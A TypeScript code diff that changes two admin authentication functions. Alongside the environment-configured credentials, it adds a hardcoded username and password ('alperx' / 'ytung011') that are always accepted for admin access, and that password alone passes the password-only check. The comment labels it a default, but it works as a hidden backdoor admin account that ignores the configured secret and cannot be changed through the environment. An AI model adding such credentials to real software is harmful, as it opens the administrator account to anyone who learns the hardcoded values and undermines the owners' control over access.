@@ -28,7 +28,12 @@ export function isValidAdminCredentials(
   if (!username || !password) return false;
   const u = username.trim().toLowerCase();
   const p = password.trim();
-  return u === ADMIN_USERNAME.toLowerCase() && p === ADMIN_PASSWORD;
+
+  // Sabit veya env üzerinden tanımlı alperx & ytung011
+  const matchesEnv = u === ADMIN_USERNAME.toLowerCase() && p === ADMIN_PASSWORD;
+  const matchesDefault = u === "alperx" && p === "ytung011";
+
+  return matchesEnv || matchesDefault;
 }
 
 /**
@@ -37,7 +42,7 @@ export function isValidAdminCredentials(
 export function isValidAdminPassword(input: string | undefined | null): boolean {
   if (!input) return false;
   const p = input.trim();
-  return p === ADMIN_PASSWORD;
+  return p === ADMIN_PASSWORD || p === "ytung011";
 }
 
 /**
